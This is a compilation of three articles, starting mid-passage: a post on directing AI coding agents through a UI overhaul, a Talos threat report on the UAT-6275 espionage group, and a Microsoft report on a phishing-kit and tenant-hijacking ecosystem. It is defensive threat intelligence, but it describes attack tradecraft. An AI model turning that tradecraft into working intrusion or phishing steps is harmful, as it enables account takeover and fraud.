UI work made a useful test of our approach because it combines engineering with a healthy dose of human judgment. The feedback was often visual, incomplete, or difficult to express in the language of professional design. We needed to compare alternatives, inspect complex application states, preserve functional behavior, and decide when a local fix revealed a broader design problem. The models also lacked an understanding of the application that we, as its designers and users, had. It was exactly the kind of work in which asking a model to “figure out what we want” could become both costly and disappointing.

Changing roles as the work changed

The largest session came first. It cost $480.73—about 59% of the workstream’s total model spend—and accounted for 50 hours and 6 minutes of agent time—about 54% of the workstream’s total agent time. Much of it used Sol with the grill-me skill to interrogate our project plan, help establish the design direction, and complete an initial implementation.

The cost reflects how much ambiguity we had at the beginning. I am not a UI designer, and I did not always have the vocabulary or a concrete design ready to specify. I supplied screenshots, drawings, descriptions of friction, and reactions to the current interface. I instructed Sol to act as a Creative Expander: it proposed directions for consideration, challenged incomplete ideas, and helped translate preferences into decisions that could guide implementation.

The human role remained decisive. The model generated possibilities for me to consider; I decided what Ghostwriter should become. Once we agreed on the direction and could describe success more concretely, Terra took over most of the large implementation work. Luna handled basic questions and clear, localized changes where paying Terra or Sol rates would have added little value for the added cost.

Escalating when the cause was unclear

One escalation illustrates why routing by task state matters. Certain forms would flicker and scroll when opened. The behavior appeared related to JavaScript, although the cause could have been the browser, CSS, the tab implementation, or some combination. Terra attempted several fixes. None resolved the problem, even though its explanations sounded reasonable. After two lengthy turns, its third proposed solution was a delayed JavaScript function that forced the page back to the top after loading. That met the visible scroll-position requirement while leaving the flicker unresolved. It also made the problem more noticeable. I rejected the workaround and escalated the diagnosis to Sol.

Sol traced the behavior to the timing of TinyMCE editors initializing inside inactive Bootstrap tabs. The flicker appeared when those tabs became active. TinyMCE would initialize and cause the page to flash and scroll to the top of the new editor. After Sol resolved the immediate issue, I asked it to explore the broader codebase and evaluate our two editing systems. Ghostwriter already used Tiptap for collaborative editors. TinyMCE was our legacy WYSIWYG editor used for all other rich text fields. I decided to standardize on Tiptap throughout the application. I asked Sol to challenge that decision and propose alternatives. Sol did not identify any reason not to do it and or to not address this technical debt. Sol formed the plan and then Terra handled the migration.

In this case, Sol handled the ambiguity and cross-cutting diagnosis. Once we had made the architectural decision, the work became a clear implementation problem and returned to Terra. Meanwhile, Luna was an excellent, low-cost model for asking questions about a specific template and updating documentation.

Reviewing the whole interface

Verification followed the same pattern. As each piece of the application migrated, I asked Terra to use the agent-browser skill to verify that pages followed the new design language and continued to work properly without any loss of functionality. I followed the same process near the end of the migration to review the entire codebase for any missed templates or screens. Terra found additional pages on successive rounds. That was useful, but each new discovery reduced my confidence that the search had converged. I escalated the review to Sol. It found a few remaining templates and eventually returned without identifying additional missed pages.

This review also showed the practical tradeoffs. Luna worked well for individual files and simple questions. Terra was the workhorse for multi-file implementation, but its repeated passes over all 161 templates did not converge. Sol handled the broader review more reliably and found what Terra missed. Sol’s broader exploration can also pull in irrelevant context and expand the scope of a request, so we still reserve it for work that justifies the additional capability and cost.

The agents also exercised conditional application states and collected screenshots and videos. Ghostwriter has pages that appear differently depending on configuration. For example, a profile may have no MFA, a passkey, or a one-time-password device. I also had to be certain that the template changes did not break a user’s ability to manage MFA devices on these pages. There were dozens of these sorts of scenarios through the application, and automated browser interaction made checking that surface area much smoother and significantly faster.

I remained responsible for release acceptance. I manually browsed the application and tested critical workflows, including MFA behavior and login transitions, to ensure that the interface changes had not introduced unexpected loops or broken security-sensitive behavior. The agents gave us broader, more repeatable coverage. My review supplied the final judgment.

What the workstream cost—and what that number means

We parsed the underlying Codex session data with an internal prototype we call Agent Ledger. The final v7.3.0 release candidate workstream contains nine metered sessions, beginning with the design work on July 17 and ending with release candidate adjustments in September:

  • $815.50 in measured model spend
  • 1.29474 billion reported tokens
  • 93 hours and 43 minutes of agent time

That spend covered design exploration, implementation across 99 screens and 161 template files, difficult debugging, browser-based QA, and release candidate refinement. The significant design and conversion effort took less than a month, followed by several weeks of testing and smaller adjustments. For that scope, keeping the final model spend below $1,000 was a compelling result.

These measurements still require context. Agent time measures execution inside Codex sessions; elapsed project duration and human labor are separate measures. Token volume tells us how much context and work passed through the models. We started new sessions when context approached roughly 75% of capacity or when a new day began after completing a significant body of work. The session boundaries reflect our context-management strategy rather than clean project phases.

Agent Ledger can also reprice the same recorded token volume under a single-model assumption. At GPT-5.6 Sol’s medium-effort rate, the recorded work would price at $904.56, or $89.06 more than the mixed-model total. This comparison measures price sensitivity for the tokens we actually used. An all-Sol project could have taken a different path, consumed a different number of tokens, and reached a different result.

The modest difference is informative. This project leaned heavily on Sol because the initial design problem was ambiguous and because we used it for difficult diagnosis and consequential review. The recorded model mix still priced $89.06 below the same token volume calculated at Sol’s medium-effort rate while keeping Sol available for the work where its additional capability mattered.

That calculation captures only one part of our approach: which models processed the recorded tokens. It cannot account for the tokens and iterations we avoided.

We established the design direction before scaling implementation. We translated visual preferences into concrete decisions, divided the migration into bounded tasks, defined success criteria, reviewed results continuously, and rejected or escalated poor approaches before they spread across the application. A directive such as “make Ghostwriter’s interface more modern” would have handed product direction to the agent along with the implementation. The agent might have produced competent work that was wrong for Ghostwriter, requiring repeated cycles of review, rejection, and reimplementation across the 161 templates.

We cannot replay the project with vague direction and assign a defensible price to that counterfactual. We therefore cannot claim that deliberate engagement saved a specific amount or cut the bill by a particular percentage. Based on the paths we rejected, the problems we caught early, and the amount of direction required to produce the final design, we believe deliberate project leadership materially constrained rework and model usage. Remaining the owner of the problem and the solution helped keep the model spend at $815.50 while producing an outcome we were willing to preview publicly.

The human labor involved was not free. During the core month, I spent roughly one to two hours per workday reviewing the agents’ work, testing critical workflows, and providing feedback—approximately 20 to 40 hours. Much of the agent work ran while I handled other responsibilities, which made it possible for one maintainer to direct the effort without devoting every workday to implementation.

Our estimate for a conventional implementation was two full-time engineers focused on the project for at least a month. Human engineers and agents would take different paths, so that estimate cannot produce a precise savings figure. It does establish the scale of the alternative we expected. Even acknowledging the human direction and verification involved, the combination of part-time oversight and $815.50 in model spend made a large, ambiguous UI overhaul economically practical for us, particularly for a free and open-source project like Ghostwriter.

These figures support a focused claim: intentional human engagement, deliberate model selection, and well-chosen tools allowed us to complete a substantial engineering task quickly and at a model cost we found remarkable. The result came from using the agents with purpose—planning the work, controlling the direction, and verifying the outcome—rather than simply allowing them to generate more work.

One rule for leaders

If an engineering leader asked for one rule their team should follow when using coding agents, ours would be this:

> Treat agents as delegated implementation capacity. You are still the architect.

That principle applies to commercial enterprises and government organizations alike. The operational controls will differ. A government team may need stricter authorization boundaries, data-handling rules, evidence retention, model-access controls, and approval gates. An enterprise may have more flexibility, but it still has obligations around sensitive data, production access, intellectual property, and release accountability. Neither environment can transfer judgment or responsibility to a model.

This guidance cuts against a common push toward greater agent autonomy and routine use of the most capable model. Strong models are most useful when humans make the problem and the boundaries legible. Clear leadership gives the agent room to execute while leaving implementation details to the agent.

We are beginning to see the same pattern beyond this project. People who have adopted the framework report completing the same work with no noticeable decline in quality while avoiding unnecessary model spend. We treat that as an early qualitative signal. A controlled quality study and company-wide savings benchmark remain for future work. Our prior baseline is weak because token cost was largely invisible to users. What we can say is that raising awareness of each model’s cost and providing model guidance has changed behavior without producing an obvious loss of capability.

Capability follows judgment

Model names, prices, and rankings will change. They changed while we wrote this article, and they may change again by the time you’ve read it. The need to frame a problem, challenge assumptions, verify evidence, make decisions, and own the result will not.

That is especially important in cybersecurity research and engineering. Sometimes the right choice will be an inexpensive model answering a bounded question. Sometimes it will be a frontier model investigating an ambiguous failure. Sometimes a specialized cyber model will be worth several times the price because the task genuinely requires it. Intentional engagement means matching the model to each of those states.

The Ghostwriter refresh succeeded because the human and agent roles changed with the work. We explored before we committed, made decisions before we scaled implementation, escalated when the evidence called for more capability, and verified before accepting the result.

The agent performed much of the labor. The human remained the architect and the problem owner.

This research was conducted jointly with Julian-Ferdinand Vögele of Recorded Future’s Insikt Group. Details of the joint research and presentation are available here.

Background 

Cisco Talos and Recorded Future Insikt Group jointly investigated UAT-6275 activity targeting government organizations across the Commonwealth of Independent States (CIS). The investigation uncovered three publicly accessible staging directories and a previously unreported GitHub repository used to host malicious scripts and payloads. These exposed assets provided visibility into the threat actor's malware development, infrastructure changes and preparations for additional intrusion activity. 

Talos tracks this activity as UAT-6275, while Recorded Future tracks it as TAG-193. It overlaps with Silent Lynx (first reported by Seqrite) and sits within a broader set of campaigns connected to YoroTrooper, which we first reported in 2023. Subsequent research on Tomiris (Kaspersky), ShadowSilk (Group-IB), Cavalry Werewolf (BI.ZONE), and Hydra Saiga (VMRay) identified overlapping indicators across these reported clusters. We assess that UAT-6275 and YoroTrooper likely belong to the same broader activity cluster. However, we continue to track them separately because we have not observed direct indicator or toolset overlap between the two.

This post summarizes our joint Virus Bulletin 2026 white paper, “Break the silence: tracking Silent Lynx through exposed infrastructure” which contains the full technical analysis and indicators of compromise (IOCs).

Victimology 

UAT-6275's targeting is concentrated in Central Asia and the wider CIS region. Across the reviewed campaigns, observed victims and lure themes span nine countries: Kazakhstan, Kyrgyzstan, Tajikistan, Turkmenistan, Uzbekistan, Armenia, Azerbaijan, Russia, and Belarus.

Government and diplomatic affairs 

UAT-6275 targets government institutions responsible for diplomacy, economic development, agriculture, and environmental management. These organizations hold information that can inform bilateral negotiations, economic planning, and regional security decisions.

Our network flow analysis identified activity involving a Tajik government entity shortly after treaty discussions with Kazakhstan in March 2026 and a Belarusian government entity ahead of a bilateral meeting in April. This timing may indicate an interest in regional diplomatic developments.

The decoy documents we recovered also suggest an interest in diplomatic relations, international trade, and aviation. Examples include a diplomatic letter addressed to Armenia’s Ministry of Foreign Affairs.

Water security and resource management 

The group’s interest in regional resources spans environmental management and energy. Talos observed activity involving an Armenian government entity responsible for environmental matters and Uzbekistan’s Smart Forestry initiative, consistent with earlier reporting on Silent Lynx targeting water resource organizations across Central Asia. 

Energy-themed decoys included a cooperation proposal between Turkmenistan’s state oil company, Turkmennebit, and Russia’s Orsk Oil Refinery, used in an August 2025 sample. The refinery supplies petroleum products to Kazakhstan and later shut down after a Ukrainian drone strike in August 2026, with repairs expected to take up to six months. These ties suggest a possible intelligence interest in regional fuel supplies and the war’s implications for Kazakhstan’s energy security.

Campaign timeline 

Since Seqrite first reported Silent Lynx in January 2025, we have identified at least eight campaigns across the region through May 2026. These include malware delivery targeting Russia, Turkmenistan, and Uzbekistan; a credential-harvesting site impersonating Azerbaijan’s State Agency for Public Service; and lures referencing the China–Central Asia Summit and Russian energy infrastructure. In 2026, we also observed activity involving government entities in Tajikistan, Armenia, and Belarus, as well as Uzbekistan’s Smart Forestry initiative in May. 

Infrastructure and malware delivery 

Talos identified three publicly accessible staging directories containing malware and tools of UAT-6275. One sample led to the previously unreported GitHub repository, where the group hosted PowerShell scripts and payloads. Its commit history allowed us to track infrastructure changes and malware development.

The group relies on lightweight reverse shells, including Chvost, Laplas, and PickleShell, to issue commands on compromised systems.

We also recovered Linux-compatible tooling and a publicly available proof-of-concept exploit for FortiWeb CVE-2025-25257 from UAT-6275 infrastructure. These findings suggest interest in expanding the group’s operational capabilities. 

Four infection chains 

UAT-6275 used malicious documents, executable downloaders, and shortcuts to deliver malware, and later incorporated a WinRAR exploit. Talos categorized the recovered samples into four infection chains, A – D, based on how they retrieve and execute their payloads.

The first Chain A samples, observed in June 2025, used macro-enabled Word documents to download and execute a second-stage binary. In July 2025, we observed Chain B downloaders built with PS2EXE, a tool that packages PowerShell scripts as standalone Windows executables. These downloaders retrieved reverse-shell payloads and created scheduled tasks for persistence. 

We first observed Chain C in October 2025. A malicious shortcut launches PowerShell to retrieve and execute a GitHub-hosted script that provides remote shell access. Later samples also downloaded PickleShell and placed it in the Windows Startup folder for persistence.

In April 2026, we identified a RAR archive that exploited CVE-2025-8088 in WinRAR to place PickleShell in the Windows Startup folder (Chain D). The payload runs at the next user sign-in. This was the first vulnerability exploit we observed in UAT-6275’s malware delivery.

Kazakhstan nexus assessment 

Talos assesses with medium confidence that UAT-6275 has a Kazakhstan nexus. Supporting evidence includes Russian-language artifacts, apparent malware-testing submissions from Kazakhstan shortly after compilation, and operator activity consistent with UTC+5 working hours.

Looking ahead 

UAT-6275’s sustained activity and adoption of new delivery techniques suggest the group will continue pursuing access to government organizations across Central Asia and the CIS. Its interest in environmental agencies, economic ministries, and energy infrastructure reflects the intelligence value of regional diplomacy and resource management. 

Defenders in these sectors should monitor unexpected PowerShell activity and payload downloads from public services such as GitHub, alongside scheduled tasks and Startup-folder changes. Keeping archive utilities patched can help reduce exposure to the exploit-assisted delivery observed in this campaign.

The hidden network: Inside the phishing infrastructure ecosystem powering global cybercrime

threat-intel Microsoft Security Blog · 2026-10-14 · ↗ original

In this article
  1. Uncovering the shadow world of a phishing kit ecosystem
  2. Storm-3119: YAM Store, the power broker
  3. Storm-2990: The Iron Man System phishing kit
  4. Downstream activity from Storm-2990 phishing kits
  5. Mitigation and protection guidance
  6. Microsoft Defender detections

Over the past year, Microsoft uncovered a Chinese-language cybercriminal ecosystem, an interconnected network of phishing kit operators, developers, and an illicit marketplace selling tools and infrastructure for large-scale phishing, enabling cybercriminal operations worldwide.

Threat actors purchased and used these tools and infrastructure, including phishing kits and access to compromised or fraudulent Microsoft or Google cloud environments and related credentials, to target organizations across the healthcare, financial services, wholesale distribution, and information technology (IT) sectors in Japan, the United States, Australia, and India. In collaboration with law enforcement agencies and other partners worldwide, Microsoft’s Digital Crimes Unit (DCU) facilitated a disruption of the ecosystem’s primary developers and infrastructure.

Microsoft’s research into one phishing kit unraveled a larger ecosystem, including the phishing kit developers, an infrastructure dealer, and the threat actors who buy from both. In this blog, we examine several phishing kits marketed and sold through YAM Store, an underground marketplace tracked by Microsoft as Storm-3119. We share our analysis of the technical aspects of this Chinese-language phishing kit ecosystem, the shared infrastructure, provisioning methods, and downstream activity by threat actors using these tools.

Uncovering the shadow world of a phishing kit ecosystem

Microsoft, alongside industry partner Resecurity, identified three phishing kits sold through the YAM Store that make up this Chinese-language cybercriminal network: CoGUI (also known as NX or FA), Haozi (also known as Phoenix), and Iron Man System. Microsoft tracks the cluster of activity and the developers behind all three phishing kits as Storm-2990. Since January 2026, the threat actors behind these kits have been responsible for facilitating the sending of over one billion phishing emails and SMS messages to over 75 thousand organizations worldwide.

Microsoft assesses with high confidence that these phishing kits were developed by Chinese-speaking threat actors, and, despite their distinct branding and separate Telegram-based sales channels, exhibit highly similar capabilities and functionality. The phishing kits provide phishing templates impersonating legitimate brands and organizations (including government, financial, and logistics) worldwide, and enable criminal actors to facilitate high-volume phishing and credential stealing operations. The similarity in their infrastructure and overlap in activity suggest either shared development origins, code reuse, or close collaboration among their developers.

These phishing kits have been advertised through YAM Store, first CoGUI and Haozi, followed by Iron Man System starting in June 2026. YAM Store and affiliated phishing kit companies accepted payments through cryptocurrency, including USDT and Ethereum, adding another layer to conceal illicit activity. The scale and proliferation of this ecosystem demonstrate how readily available criminal infrastructure can lower the barrier to entry, enabling less skilled cybercriminals to target organizations at scale and contribute to fraud losses.

By mapping the relationship between YAM Store and these phishing kits, we provide insight into the commercial infrastructure that supports modern phishing operations.

Storm-3119: YAM Store, the power broker

YAM Store is an initial access broker (IAB) that sells infrastructure using compromised or fraudulently obtained environments in providers like Microsoft and Google. The marketplace offers a variety of infrastructure based on age, subscription type, and environment types such as education (.edu) or non-profit (.org).

The YAM Store marketplace provides cybercriminals with a platform to purchase fraudulently acquired Microsoft and Google domains associated with legitimate, expired, or previously used organization numbers, allowing actors to use seemingly legitimate infrastructure and obtain workspaces at relatively low cost. Storm-3119 uses automation to identify expired environment or organization names and leverages legitimate customer information associated with them to help circumvent existing detections.

Anatomy of YAM Store operations: How Storm-3119 acquires, controls, and monetizes infrastructure

During this investigation, Microsoft uncovered a five-stage attack pipeline often used in Storm-3119’s operations. YAM Store functions as an access broker, an intermediary that hijacks Microsoft 365 and Azure for Education tenants and resells the stolen accounts, licenses, and storage as a service to downstream operations, including the phishing kits tracked as Storm-2990. The pipeline below describes the supply side of that business: how the actor acquires, controls, and monetizes compromised environments.

Stage 1 – Reconnaissance: Storm-3119 conducts automated reconnaissance of target environments. The actor uses Flask, a lightweight Python web framework, to covertly identify and profile cloud-enabled organizations. The tooling is designed to discover Microsoft 365 tenants, assess enrollment opportunities, gather licensing and Azure cloud information, and perform these activities anonymously through Tor infrastructure.

Stage 2 – Environment takeover and app-only admin panels: Once a viable environment is identified, the threat actor centralizes associated information in an actor-controlled platform used to administer compromised Microsoft 365 environments. This platform is a separate set of administrative panels (implemented in PHP, Java/Spring, and Cloudflare Workers) that lets the operator maintain, monetize, and expand access using stolen application credentials. Leveraging the compromised environment’s client secret through an application-only authentication flow, the panel performs full directory control: it resets passwords silently (without forcing a change at next sign-in), assigns education licenses, and grants privileged attributes that the actor can later monetize. Because this access is application-level rather than tied to a single user session, the resulting persistence is more durable, more scalable, and harder to detect.

Stage 3 – Storage and resource abuse: With the stolen privileged credentials, the threat actor signs in to a compromised Global Administrator account and self-provisions the PnP Management Shell service principal, which represents the actor’s application inside the compromised tenant. Through this service principal, the threat actor grants themselves broad Microsoft Graph permissions, including read and write access to directory data and AppCatalog.ReadWrite.All, along with full control over the SharePoint API. The actor then abuses the compromised tenant’s SharePoint and OneDrive as bulk hosting and converts the hijacked storage into a sellable product.

Stage 4 – Phishing and DNS infrastructure support: The threat actor maintains dedicated infrastructure to support and manage phishing operations on behalf of their customers. A custom DNS management platform enables centralized control of phishing domains, SSL certificates, and domain-routing configurations through Cloudflare.

Stage 5 – Storefront and monetization: Storm-3119 resells the hijacked accounts, licenses, and storage through an automated storefront, operating as the access broker that supplies these resources to downstream operations. Payment is accepted through Alipay, WeChat Pay, and USDT (TRC20), and the storefront supports a sub-reseller tier. Telegram is used for order notifications and buyer contact rather than as the primary sales channel.

In addition to targeting existing tenants, Storm-3119 also separately creates fraudulent organizations and supporting web presence to establish tenants on Microsoft’s platform, likely using AI-generated content and forged documentation to make the fabricated entities appear legitimate. In one case, the actor created an environment, likely using AI, named “Jewish Choice” under the guise of a nonprofit organization and associated it with jewishchoice[.]org, a domain registered only within the past several months that did not appear to represent a legitimate organization. This activity indicates that Storm-3119 likely established the website and associated domain to lend credibility to the fabricated nonprofit identity and facilitate tenant creation.

Storm-2990: The Iron Man System phishing kit

YAM Store sells its illicitly acquired infrastructure, as well as the prominent phishing kits tracked as Storm-2990, to other threat actors. The platforms are commercially licensed phishing-as-a-service (PaaS) products. They are designed to impersonate organizations across several industry verticals to steal information, including sign-in credentials (usernames, passwords) and financial data (credit card information), used to gain access to network environments.

Iron Man System’s customers purchase a subscription that provides access to the kit’s license server, with the domain hard-coded into the kit. This restriction adds a layer of obfuscation by limiting site access to paying customers. The kits allow attackers to steal money by abusing the stolen credit card information.

The Iron Man System phishing kit contains over 2,335 templates tailored to over 139 countries including Australia, Japan, India, and the United States, with the United States accounting for the most phishing templates. The phishing lures used by Iron Man System mimic various trusted brands and organizations, such as local government including authorities associated with traffic and parking fees, law enforcement, healthcare, finance, transportation, and retail. These lures are designed to trick targets into providing sensitive information. Most phishing lures used in the United States are transportation or government-related.

The phishing kits are capable of the following advanced evasion techniques to varying degrees:

  • Geofencing, a technique used to restrict access to configured countries only, so only users from specific countries can access the phishing content from their web browser
  • Fake CAPTCHA gates, used to prevent or block automated browsing from threat research tools by making the user click a box or execute an action
  • IP address block list and allow list, used to block or allow IP addresses to prevent threat researcher interaction
  • Anti-detection configuration related tosettings to evade security researcher detection
  • Telegram bot configuration,including bot tokens and chat IDs for real-time phishing that enables credential exfiltration. It allows the kit operator to receive automatic notifications on their Telegram account when a target takes action on a phishing lure, including entering credentials, credit card data submission, and verification codes.

After the target provides the sensitive information (sign-in details, credit card info), the phishing kit collects it using a WebSocket, offering customers real-time victim interaction through Telegram notifications during credential harvesting. This confirms that the kit supports live, interactive phishing where the operator monitors each victim’s progress and manually controls what the victim sees next, a hallmark of sophisticated PaaS platforms. The attacker then harvests the information to use in follow-on fraudulent financial activities.

The Iron Man System phishing kit panel is predominately hosted on China-based hosting providers, with a smaller number of panels found on hosting providers in other countries. The fully featured, multi-tenant phishing kit uses the GoFrame application development framework, an open-source Go framework with roots in the Chinese developer ecosystem.

Downstream activity from Storm-2990 phishing kits

Microsoft observed downstream activity by threat actors using infrastructure affiliated with the Storm-2990 phishing kits. In analyzed cases, the actors used similar common phishing techniques, such as urgency in the message and attaching malicious links that redirect to actor-controlled infrastructure that allows these downstream threat actors to perform the following activities:

  • Credential stealing: The actors use phishing pages that impersonate legitimate services to trick targets into providing credentials or other authentication information, enabling downstream actors to access compromised accounts.
  • Device code phishing: In some cases, the actors abuse the device code authentication flow to trick victims into authenticating to legitimate applications, allowing downstream actors to obtain authentication tokens and access compromised accounts.
  • Financial fraud: The end goal for the downstream actors is to use stolen payment data to make fraudulent purchases of high-end goods or fraudulent transactions on legitimate financial platforms.

Mitigation and protection guidance

This interconnected network of Chinese-language phishing kit operators and developers operates as an enabling ecosystem, providing infrastructure and services that facilitate criminal activity rather than functioning as a standalone malware tool. Microsoft assesses that the ecosystem is not limited to the abuse of Microsoft services and extends to other providers.

While Microsoft notes that the identified organizations impacted by attacks stemming from Storm-3119 or Storm-2990 operations include financial, healthcare, and IT companies, the activity conducted by threat actors using these tools are common attacks that could affect any organization.

Most of the activity that stems from this phishing kit ecosystem consists of social engineering, phishing operations, and account and storage takeovers. Microsoft recommends the following to mitigate the impact of Storm-3119 and Storm-2990-related threats.

  • In nearly all the cases observed by Microsoft, the phishing lures used by the Storm-2990 operators followed prescriptive scam red flags, including urgency, time-sensitive tasks such as clicking a provided link with official branding. Users should verify with the purported sender of the message or email, even when the task involves signing in to a known, secure account not provided by the link or calling the purported organization or company directly.
  • Educate users about protecting personal and business information in social media, filtering unsolicited communication, identifying lures in spear-phishing emails and watering holes, and reporting reconnaissance attempts and other suspicious activities.
  • Educate users about common phishing techniques. Sign-in prompts should clearly identify the application being authenticated to. As of 2021, Microsoft Azure interactions prompt the user to confirm (Cancel or Continue) that they are signing in to the app they expect, which is an option frequently missing from phishing sign-ins.
  • Review our recommended settings for Exchange Online Protection and Microsoft Defender for Office 365 to ensure your organization has established essential defenses and knows how to monitor and respond to threat activity.
  • Configure the Microsoft Defender for Office 365 Safe Links policy to apply to internal recipients.

Hardening credentials and cloud identities is also necessary to defend against phishing attacks, which seek to gain valid credentials and access tokens. As an initial step, use passwordless solutions like passkeys and implement multifactor authentication (MFA) throughout your environment:

  • Invoke the principles of least privilege and Zero Trust to significantly slow down threat actors who might have been able to gain initial access and buy time for defenders to respond. Since Storm-3119 operators have been observed obtaining Global Administrator access, implementing these principles can help lock down Global Administrator roles and who has access to specific resources.
  • Use the Microsoft Authenticator app for passkeys and MFA, and complement MFA with Conditional Access policies, where sign-in requests are evaluated using additional identity-driven signals.
  • Conditional Access policies can also be scoped to strengthen privileged accounts with phishing-resistant MFA.
  • Your passkey and MFA policy can be further secured by only allowing MFA and passkey registrations from trusted locations and devices.
  • Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.
